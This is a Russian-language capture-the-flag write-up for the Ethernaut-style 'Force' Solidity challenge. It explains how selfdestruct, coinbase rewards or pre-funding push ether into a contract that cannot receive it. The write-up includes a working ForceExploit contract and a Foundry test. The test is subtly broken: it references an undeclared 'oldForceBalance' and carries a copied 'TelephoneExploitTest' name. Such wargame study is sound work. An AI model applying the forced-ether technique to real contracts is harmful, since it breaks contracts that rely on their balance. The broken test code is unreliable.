# 7. Force
В контракте отсутствуют способы получения денег. Цель уровня - изменить нулевой баланс контракта.

В Solidity есть функция (на данный момент устаревшая), которая позволяет перевести все деньги с контракта на другой - `selfdestruct()`.
`selfdestruct()` отправляет все денежные средства на переданный адрес и уничтожает контракт (только в до определенной версии EVM).

Сейчас же, после обновления Dencun/Cancun, `selfdestruct` больше не удаляет код контракта и хранилище, если контракт не был создан в той же самой транзакции, но функция все еще пересылает весь Эфир на адрес. 

Есть еще способы пополнить баланс контракта без принимающих функций:
- Coinbase transaction: указать адрес контракта как получателя награды за майнинг
- Pre-funding: вычислить адрес будущего контракта до его деплоя и отправить туда деньги заранее, а после деплоя у него будет не нулевой баланс

Код контракта `Force.sol`:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }
```

Код эксплойта `ForceExploit.sol`:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceExploit {
    constructor(address payable _target) payable {
        selfdestruct(_target);
    }
}
```

Код теста эксплойта `ForceExploit.t.sol`:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {Force} from "src/Force/Force.sol";
import {ForceExploit} from "src/Force/ForceExploit.sol";

contract TelephoneExploitTest is Test {
    Force public force;
    ForceExploit public forceExploit;
    address guy = makeAddr("guy");

    error TransferFailed();

    function setUp() public {
        vm.startPrank(guy);
        force = new Force();
        vm.stopPrank();
    }

    function test_Exploit() public {
        uint256 amount = 1 ether;
        vm.deal(guy, amount);
        vm.prank(guy);
        forceExploit = new ForceExploit{value: amount}(payable(address(force)));
        uint256 newForceBalance = address(force).balance;

        assertEq(newForceBalance, oldForceBalance + amount);
    }
}
```